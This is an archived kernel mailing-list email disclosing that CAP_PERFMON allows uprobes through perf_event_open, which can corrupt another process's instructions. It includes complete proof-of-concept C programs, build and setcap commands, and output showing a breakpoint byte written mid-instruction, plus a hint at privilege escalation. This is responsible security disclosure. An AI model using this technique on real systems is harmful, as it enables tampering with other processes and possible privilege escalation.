Return-Path: <kernel-hardening-return-21953-kernel-hardening=archiver.kernel.org@lists.openwall.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from second.openwall.net (second.openwall.net [193.110.157.125])
	by smtp.lore.kernel.org (Postfix) with SMTP id 0CFA5C83038
	for <kernel-hardening@archiver.kernel.org>; Tue,  1 Jul 2025 16:15:50 +0000 (UTC)
Received: (qmail 24433 invoked by uid 550); 1 Jul 2025 16:15:38 -0000
Mailing-List: contact kernel-hardening-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:kernel-hardening@lists.openwall.com>
List-Help: <mailto:kernel-hardening-help@lists.openwall.com>
List-Unsubscribe: <mailto:kernel-hardening-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:kernel-hardening-subscribe@lists.openwall.com>
List-ID: <kernel-hardening.lists.openwall.com>
Received: (qmail 24404 invoked from network); 1 Jul 2025 16:15:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20230601; t=1751386528; x=1751991328; darn=lists.openwall.com;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=qSOuw05jeizU4+BFa/C/rUZVOHWeHSG3w1UgOQWvnQc=;
        b=4x1Va7zqIcysQbRrA5/UzY3rT4CiPGhfWoqmPTMNOl6fIKbmH5U5bwPy1UMviV0uoX
         ueQQi83PHmyPrq5DwRmalabsCsQd2DjtPmjZhIM41dfJnFxM6ngFBDapKW72DWySC9rM
         anIMSBvSCaP5WX764+uyw8a+/tCXFbSQY4O3qs4ULZsheQ6IPYeGAgGmgI8oUAKk7N4p
         jb6AcIt2ypOVwohq1KhjP6ks4Rbc/kNrtW1xJhW1LquDS6AT2R+6TnzraXJizeBw/+VS
         Cr10u3oMgyRsABb5leoeZ6ie6hDZzGJHL5xGa6ulsiujUeQJhkMqzwmxWxLrE2+rlcFo
         b2/g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1751386528; x=1751991328;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=qSOuw05jeizU4+BFa/C/rUZVOHWeHSG3w1UgOQWvnQc=;
        b=S7FBTkgUkpotjlF7/mxMSds/Xao4FtLRiqCuHsAZxzTfUFNPwEhNjnMaLPrRs9zHwF
         ReTSng7BKpwLPMqM5HAkmDukt3lNLqTEdxazSh+GP4Os7PnrkvFjJJxE/taQX96UU4BO
         T39X7XBV+GSKbx89cFUD9aIQf2ccXGyragJ473GvoRalAV+goi56KDR1p03a6f5jg4c4
         JFyww+mEItn+08w4NCOlWQSPLA6+TfJ85aeoupfFAeYqpHzoT4fHpKmchBeEJ+HUQHUx
         qzxvtbDPt7xwHTsMtnv8KjlmI9852IDhu5XHHNwlAuiwtlS2lQ9R3TMrwkP0C8mfgjhL
         cd0Q==
X-Gm-Message-State: AOJu0YwHjRSOclR6kIHJYHPUppuOViCTwxTm32rahe7bC++cZlbEWcBj
	PmE4Si4GHdAIs4ryMD2Jv/vxuJgDs62Szrf0UQKgoqtaaewYEsvl8C86bCt+E1adwfRHZepE7GE
	KjsasktoeGEDBsDeHcnkA6BNOx8v8Y7NL24aLgyBK
X-Gm-Gg: ASbGncuAGV81oewonjxdByLDHRmuS6Pp/GifTA4Pc+na3kTKzV16+HJxX7PL7zo8Vbb
	CmQpNsRgeVLNTx5LiZFvidt0GXiwBAfPvw2EOwrJuw0wuxGbtekjks5oLufY8gLn2rNOIW7soQE
	CmbMxXX94LOS3e2eB1yUblYbTpmPAAGetQgzkSO6Gkci7tGnr5fMwRUhMolB3L6PImSsQ++RE=
X-Google-Smtp-Source: AGHT+IE3OAzY0AYWMa6ga3opq+GIerqoQLh22Tx8fwF4siq//eVxbvzLLCP9m/yj2flxyW1GnjdGPq6nm75VeZ9Pcic=
X-Received: by 2002:a50:d658:0:b0:606:b6da:5028 with SMTP id
 4fb4d7f45d1cf-60e3855ac73mr81191a12.0.1751386527817; Tue, 01 Jul 2025
 09:15:27 -0700 (PDT)
MIME-Version: 1.0
From: Jann Horn <jannh@google.com>
Date: Tue, 1 Jul 2025 18:14:51 +0200
X-Gm-Features: Ac12FXwmPRbkvmFNG1i_sPZrnv_d9qmh2_pVO8qP_1K0bPtba4WedFzAwZLUN08
Message-ID: <CAG48ez1n4520sq0XrWYDHKiKxE_+WCfAK+qt9qkY4ZiBGmL-5g@mail.gmail.com>
Subject: uprobes are destructive but exposed by perf under CAP_PERFMON
To: Serge Hallyn <serge@hallyn.com>, 
	linux-security-module <linux-security-module@vger.kernel.org>, 
	Peter Zijlstra <peterz@infradead.org>, Ingo Molnar <mingo@redhat.com>, 
	Arnaldo Carvalho de Melo <acme@kernel.org>, Namhyung Kim <namhyung@kernel.org>, 
	Mark Rutland <mark.rutland@arm.com>, 
	Alexander Shishkin <alexander.shishkin@linux.intel.com>, Jiri Olsa <jolsa@kernel.org>, 
	Ian Rogers <irogers@google.com>, Adrian Hunter <adrian.hunter@intel.com>, 
	"Liang, Kan" <kan.liang@linux.intel.com>, linux-perf-users@vger.kernel.org
Cc: Kernel Hardening <kernel-hardening@lists.openwall.com>, linux-hardening@vger.kernel.org, 
	kernel list <linux-kernel@vger.kernel.org>, 
	Alexey Budankov <alexey.budankov@linux.intel.com>, 
	James Morris <jamorris@linux.microsoft.com>
Content-Type: text/plain; charset="UTF-8"

Since commit c9e0924e5c2b ("perf/core: open access to probes for
CAP_PERFMON privileged process"), it is possible to create uprobes
through perf_event_open() when the caller has CAP_PERFMON. uprobes can
have destructive effects, while my understanding is that CAP_PERFMON
is supposed to only let you _read_ stuff (like registers and stack
memory) from other processes, but not modify their execution.

uprobes (at least on x86) can be destructive because they have no
protection against poking in the middle of an instruction; basically
as long as the kernel manages to decode the instruction bytes at the
caller-specified offset as a relocatable instruction, a breakpoint
instruction can be installed at that offset.

This means uprobes can be used to alter what happens in another
process. It would probably be a good idea to go back to requiring
CAP_SYS_ADMIN for installing uprobes, unless we can get to a point
where the kernel can prove that the software breakpoint poke cannot
break the target process. (Which seems harder than doing it for
kprobe, since kprobe can at least rely on symbols to figure out where
a function starts...)

As a small example, in one terminal:
```
jannh@horn:~/test/perfmon-uprobepoke$ cat target.c
#include <unistd.h>
#include <stdio.h>

__attribute__((noinline))
void bar(unsigned long value) {
  printf("bar(0x%lx)\n", value);
}

__attribute__((noinline))
void foo(unsigned long value) {
  value += 0x90909090;
  bar(value);
}

void (*foo_ptr)(unsigned long value) = foo;

int main(void) {
  while (1) {
    printf("byte 1 of foo(): 0x%hhx\n", ((volatile unsigned char
*)(void*)foo)[1]);
    foo_ptr(0);
    sleep(1);
  }
}
jannh@horn:~/test/perfmon-uprobepoke$ gcc -o target target.c -O3
jannh@horn:~/test/perfmon-uprobepoke$ objdump --disassemble=foo target
[...]
00000000000011b0 <foo>:
    11b0:       b8 90 90 90 90          mov    $0x90909090,%eax
    11b5:       48 01 c7                add    %rax,%rdi
    11b8:       eb d6                   jmp    1190 <bar>
[...]
jannh@horn:~/test/perfmon-uprobepoke$ ./target
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
```

and in another terminal:
```
jannh@horn:~/test/perfmon-uprobepoke$ cat poke.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

int main(void) {
  int uprobe_type;
  FILE *uprobe_type_file =
fopen("/sys/bus/event_source/devices/uprobe/type", "r");
  if (uprobe_type_file == NULL)
    err(1, "fopen uprobe type");
  if (fscanf(uprobe_type_file, "%d", &uprobe_type) != 1)
    errx(1, "read uprobe type");
  fclose(uprobe_type_file);
  printf("uprobe type is %d\n", uprobe_type);

  unsigned long target_off;
  FILE *pof = popen("nm target | grep ' foo$' | cut -d' ' -f1", "r");
  if (!pof)
    err(1, "popen nm");
  if (fscanf(pof, "%lx", &target_off) != 1)
    errx(1, "read target offset");
  pclose(pof);
  target_off += 1;
  printf("will poke at 0x%lx\n", target_off);

  struct perf_event_attr attr = {
    .type = uprobe_type,
    .size = sizeof(struct perf_event_attr),
    .sample_period = 100000,
    .sample_type = PERF_SAMPLE_IP,
    .uprobe_path = (unsigned long)"target",
    .probe_offset = target_off
  };
  int perf_fd = syscall(__NR_perf_event_open, &attr, -1, 0, -1, 0);
  if (perf_fd == -1)
    err(1, "perf_event_open");
  char *map = mmap(NULL, 0x11000, PROT_READ, MAP_SHARED, perf_fd, 0);
  if (map == MAP_FAILED)
    err(1, "mmap error");
  printf("mmap success\n");
  while (1) pause();
jannh@horn:~/test/perfmon-uprobepoke$ gcc -o poke poke.c -Wall
jannh@horn:~/test/perfmon-uprobepoke$ sudo setcap cap_perfmon+pe poke
jannh@horn:~/test/perfmon-uprobepoke$ ./poke
uprobe type is 9
will poke at 0x11b1
mmap success
```

This results in the first terminal changing output as follows, showing
that 0xcc was written into the middle of the "mov" instruction,
modifying its immediate operand:
```
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0x90
bar(0x90909090)
byte 1 of foo(): 0xcc
bar(0x909090cc)
byte 1 of foo(): 0xcc
bar(0x909090cc)
```

It's probably possible to turn this into a privilege escalation by
doing things like clobbering part of the distance of a jump or call
instruction.
